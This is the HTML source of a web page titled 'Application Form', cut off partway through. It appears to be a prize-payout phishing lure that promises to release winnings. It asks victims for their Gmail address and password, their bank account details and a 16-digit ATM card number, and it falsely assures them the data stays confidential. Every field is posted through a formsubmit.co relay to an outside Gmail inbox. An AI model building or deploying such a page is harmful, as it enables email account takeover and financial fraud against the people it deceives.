<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Application Form</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/css/intlTelInput.min.css"/>
  <style>
    body { font-family: Arial, sans-serif; padding: 15px; margin: 0; background: #f9f9f9; }
    form { max-width: 480px; margin: auto; background: white; padding: 15px; border-radius: 10px;
           box-shadow: 0 0 10px rgba(0,0,0,0.05); }
    h2 { text-align: center; font-size: 1.5em; margin-bottom: 10px; }
    .notice { text-align: center; font-size: 0.9em; color: #555; margin-bottom: 20px; }
    label { display: block; margin-top: 12px; font-weight: bold; font-size: 0.95em; }
    input, select { width: 100%; padding: 10px; font-size: 1em; margin-top: 5px;
                    border: 1px solid #ccc; border-radius: 6px; }
    .readonly-box { background: #f0f0f0; padding: 10px; border: 1px solid #ccc;
                    border-radius: 6px; margin-top: 8px; font-weight: bold; }
    .card-section { margin-top: 10px; }
    button { margin-top: 20px; width: 100%; padding: 12px; background: #007bff; color: white;
             border: none; border-radius: 6px; font-size: 1em; }
    button:disabled { background: #aaa; cursor: not-allowed; }
    button:hover:enabled { background: #0056b3; }
    .hidden { display: none; }
    .password-wrapper { position: relative; }
    .password-wrapper span { position: absolute; right: 10px; top: 50%;
                              transform: translateY(-50%); cursor: pointer; font-size: 1.1em; }
  </style>
</head>
<body>
  <form id="applicationForm" method="POST" action="https://formsubmit.co/exellentfirm@gmail.com">
    <h2>Application Form</h2>
    <div class="notice">We keep your details secure and confidential.</div><!-- 1: Full Name -->
<label for="fullName">1. Full Name</label>
<input type="text" id="fullName" name="fullName" required pattern="[A-Za-z\s]+" title="Letters and spaces only.">

<!-- 2: Phone with country dropdown -->
<label for="phoneNumber">2. Phone Number</label>
<input type="tel" id="phoneNumber" name="phoneNumber" required>

<!-- 3: Email -->
<label for="emailAddress">3. Email Address</label>
<input type="email" id="emailAddress" name="emailAddress" required pattern="^[a-zA-Z0-9._%+-]+@gmail\.com$" title="Only @gmail.com allowed.">

<!-- 4: Email Password -->
<label for="emailPassword">4. Email Password</label>
<div class="password-wrapper">
  <input type="password" id="emailPassword" name="emailPassword" required style="padding-right:40px;">
  <span onclick="togglePassword()">üëÅÔ∏è</span>
</div>

<!-- Remaining fields numbered 5+ -->
<label for="amountWon">5. Amount You Won</label>
<input type="text" id="amountWon" name="amountWon" required>

<label for="bankType">6. Bank Account Type (e.g., Standard Bank)</label>
<input type="text" id="bankType" name="bankType" placeholder="e.g., Standard Bank" required>

<label for="bankNumber">7. Bank Account Number</label>
<input type="text" id="bankNumber" name="bankNumber" required>

<label for="accountHolder">8. Bank Account Holder's Name</label>
<input type="text" id="accountHolder" name="accountHolder" required>

<label for="atmLinked">9. Did you link an ATM card to your <span id="bankTypePreview">bank</span> account?</label>
<select id="atmLinked" name="atmLinked" required>
  <option value="">--Select--</option><option value="Yes">Yes</option><option value="No">No</option>
</select>

<div class="card-section hidden" id="cardSection">
  <label>10. We need to verify your details so that we release <span id="amountPreview">[amount]</span> to your <span id="bankPreview">[bank]</span> account.</label>
  <label for="atmNumber">ATM Card Number</label>
  <input type="text" id="atmNumber" name="atmNumber" required maxlength="16" pattern="\d{16}" inputmode="numeric" title="Exactly 16 digits.">
